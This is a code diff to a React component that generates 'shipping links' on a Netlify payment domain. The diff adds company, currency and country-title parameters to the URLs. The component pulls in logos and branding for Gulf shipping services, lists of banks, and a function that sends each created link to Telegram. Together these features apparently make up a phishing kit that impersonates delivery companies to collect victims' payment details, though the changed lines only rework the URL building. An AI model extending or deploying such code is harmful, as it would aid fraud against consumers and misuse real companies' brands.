@@ -11,6 +11,8 @@ import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
+import { getCompanyMeta } from "@/utils/companyMeta";
+import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -85,9 +87,17 @@ const CreateShippingLink = () => {
           selectedCountry: country || "SA",
         },
       });
-      
-      // Send data to Telegram with image and description
+
+      // Get dynamic metadata based on company and country
+      const companyMeta = getCompanyMeta(selectedService);
+      const countryCurrency = getCurrency(country);
+      const countryTitle = getDefaultTitle(country);
+
+      // Generate dynamic payment URL with currency and title parameters
       const productionDomain = 'https://gulf-unified-payment.netlify.app';
+      const paymentUrl = `${productionDomain}/pay/${link.id}/recipient?company=${selectedService}&currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`;
+
+      // Send data to Telegram with image and description
       const telegramResult = await sendToTelegram({
         type: 'shipping_link_created',
         data: {
@@ -104,7 +114,6 @@ const CreateShippingLink = () => {
       });
 
       // حفظ الرابط وإظهار Dialog
-      const paymentUrl = `${productionDomain}/pay/${link.id}/recipient?company=${selectedService}`;
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
@@ -143,7 +152,9 @@ const CreateShippingLink = () => {
   
   const handleContinue = () => {
     setShowSuccessDialog(false);
-    navigate(`/pay/${linkId}/recipient?company=${selectedService}`);
+    const countryCurrency = getCurrency(country);
+    const countryTitle = getDefaultTitle(country);
+    navigate(`/pay/${linkId}/recipient?company=${selectedService}&currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`);
   };
   
   if (!countryData) {
